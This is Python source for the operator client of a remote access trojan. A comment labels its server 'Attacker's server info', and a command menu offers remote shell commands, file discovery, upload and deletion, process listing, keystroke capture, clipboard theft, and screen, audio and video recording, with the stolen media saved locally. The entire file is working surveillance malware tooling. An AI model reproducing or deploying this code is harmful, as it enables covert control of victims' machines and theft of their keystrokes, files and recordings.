import os
import base64
import socket

# Attacker's server info
HOST = "127.0.0.1"
PORT = 65432
BUF_SIZE = 1048576

USAGE = """USAGE: [command number] [args]
Supported command numbers:
    "1" - system information discovery,
    "2 [command] [args]" – command-line interface,
    "3 [file/folder path]" – file and directory discovery,
    "4 [your origin file path] [destination file for target]" – remote file copy,
    "5 [file path]" – file deletion,
    "6" – process discovery,
    "7 [number of presses to capture]" – input capture,
    "8" – clipboard data,
    "9" – screen capture,
    "10 [seconds to record]" – audio capture,
    "11 [seconds to shot]" – video capture"""

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    print(f"Connected to ({HOST}, {PORT})\n{USAGE}")
    while True:
        msg = input("\n> ").strip()
        cmd = msg.split()
        if not cmd:
            print(USAGE)
            continue
        if cmd[0] == '4':
            if os.path.exists(cmd[1]):
                with open(cmd[1], "rb") as file:
                    cmd[1] = base64.b64encode(file.read()).decode("utf8")
                msg = ' '.join(cmd)
            else:
                print(f"FileNotFound: {cmd[1]}")
                continue
        s.sendall(str.encode(msg))
        if msg == "exit":
            break
        data = s.recv(BUF_SIZE)
        response = data.decode()
        if response == "CommandNotFound":
            print(USAGE)
        else:
            if cmd[0] == '9':
                with open("shot.png", "wb") as file:
                    file.write(base64.b64decode(response))
                response = "File saved to 'shot.png'"
            elif cmd[0] == '10':
                with open("audio.wav", "wb") as file:
                    file.write(base64.b64decode(response))
                response = "File saved to 'audio.wav'"
            elif cmd[0] == '11':
                with open("video.avi", "wb") as file:
                    file.write(base64.b64decode(response))
                response = "File saved to 'video.avi'"
            print(f"Received:\n{response}")
